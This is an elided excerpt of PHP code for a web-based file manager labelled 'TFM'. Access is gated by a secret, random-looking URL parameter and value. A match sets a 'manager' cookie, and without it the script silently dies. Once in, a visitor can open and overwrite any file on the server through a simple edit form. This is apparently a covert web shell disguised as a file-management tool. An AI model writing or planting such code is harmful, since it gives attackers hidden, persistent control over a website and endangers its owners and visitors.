...
if (isset($_GET['9olckwOtXRauG']) && $_GET['9olckwOtXRauG'] == 'J74Y9BAukCnV') {
    setcookie("manager", $_SERVER["HTTP_HOST"], time() + 172800);
    header('Location: ?p=');
    exit(); // Always exit after header redirection
}

if (!isset($_COOKIE["manager"])) {
    error_log("Redirecting because manager cookie is not set.");
    die();
...
if (isset($_GET['dl']))
{
    ...
    if (isset($_POST['file_content'])) {
        if (file_put_contents($filePath, $_POST['file_content'])) {
            echo "<p class='alert alert-success'>File saved successfully.</p>";
        } else {
            echo "<p class='alert alert-danger'>Failed to save file.</p>";
        }
    }
...
<form action="" method="post" class="pt-3">
            ...
            foreach ($files as $f) {
                ...
                <tr>
                    ...
                    <td class="inline-actions">
                        ...
                        <?php endif; ?>
                        <a title="<?php echo lng('Edit') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1211, '<?php echo lng('Edit'); ?>','<?php echo urlencode($f); ?>', this.href);">Edit</a>
                    </td>
                </tr>
                <?php
                flush();
    ...
    <?php
// Display  form if a file is being edited
if ($fileContent !== ''): ?>
    <h2>Editing File: <?= htmlspecialchars(basename($filePath)) ?></h2>
    <form method="POST">
        <div class="form-group">
            <textarea name="file_content" rows="30" cols="120" class="form-control"><?= htmlspecialchars($fileContent) ?></textarea>
        </div>
        <button type="submit" class="btn btn-success">Save Changes</button>
        <a href="?" class="btn btn-secondary">Cancel</a>
    </form>
<?php
// Stop further script execution if editing mode is active
exit;
endif;
?>
    <div class="row">
...
<head>
    ...
    <meta name="description" content="Web based with efficiency and ease TFM">
